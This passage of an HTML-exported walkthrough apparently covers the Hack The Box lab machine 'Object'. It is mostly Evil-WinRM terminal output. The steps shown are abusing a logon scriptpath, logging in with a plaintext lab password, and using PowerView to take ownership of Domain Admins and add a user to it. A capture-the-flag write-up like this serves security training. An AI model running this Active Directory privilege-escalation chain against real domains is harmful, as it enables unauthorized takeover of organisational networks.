+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="188d1b9f-8847-805c-a881-fd07fa78adca" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Temp&gt; upload script.ps1
+                                        
+Info: Uploading /home/drroot/Desktop/.htb/Object/script.ps1 to C:\Temp\script.ps1
+                                        
+Data: 64 bytes of 64 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Temp&gt; Set-DomainObject -Identity maria -SET @{scriptpath=&#x27;C:\Temp\script.ps1&#x27;}
+*Evil-WinRM* PS C:\Temp&gt; dir
+
+
+    Directory: C:\Temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/26/2021   8:13 AM           6144 Engines.xls
+-a----        1/26/2025   8:39 PM            830 output.txt
+-a----        1/26/2025   8:37 PM         770279 PowerView.ps1
+-a----        1/26/2025   8:39 PM             50 script.ps1
+
+
+*Evil-WinRM* PS C:\Temp&gt; download Engines.xls
+                                        
+Info: Downloading C:\Temp\Engines.xls to Engines.xls
+                                        
+Info: Download successful!
+</code></pre><figure id="188d1b9f-8847-8082-8c38-e1b1201dd785" class="image"><a href="../img/Object/image 8.png"><img style="width:628px" src="../img/Object/image 8.png"/></a></figure><h3 id="188d1b9f-8847-8014-b3a3-f503b152aa44" class="">Evil_winrm with maria</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="188d1b9f-8847-80bf-859c-f6015e35dfda" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">──(drroot㉿drroot)-[~/Desktop/.htb/Object]
+└─$ evil-winrm -i 10.10.11.132 -u maria -p &#x27;W3llcr4ft3d_4cls&#x27;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maria\Documents&gt; 
+</code></pre><h3 id="188d1b9f-8847-801f-93d5-d59c3bd2d0c2" class="">WriteOwner with Maria - Basically we can be owners of “domain admin” group and add us like admin→ <a href="https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/">Add-DomainObjectAcl</a></h3><figure id="188d1b9f-8847-8042-a9b3-c5def475e5ff" class="image"><a href="../img/Object/image 9.png"><img style="width:709.984375px" src="../img/Object/image 9.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="188d1b9f-8847-802b-adaf-ec05b02276b0" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\maria\Documents&gt; Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\maria\Documents&gt; Set-DomainObjectOwner -Identity &quot;Domain Admins&quot; -OwnerIdentity maria
+*Evil-WinRM* PS C:\Users\maria\Documents&gt; Add-DomainObjectAcl -PrincipalIdentity maria -TargetIdentity &quot;Domain Admins&quot; -Rights All
+*Evil-WinRM* PS C:\Users\maria\Documents&gt; 
+*Evil-WinRM* PS C:\Users\maria\Documents&gt; net group &quot;Domain Admins&quot; maria /add /domain
+The command completed successfully.
+
+</code></pre><h3 id="188d1b9f-8847-8024-9b07-c8efd6fce36c" class="">Open new shell</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="188d1b9f-8847-80e6-8d0f-fade57dfc8f3" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Object]
+└─$ evil-winrm -i 10.10.11.132 -u maria -p &#x27;W3llcr4ft3d_4cls&#x27;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maria\Documents&gt; cd C:\Users\Administrator\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+e******************************f
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
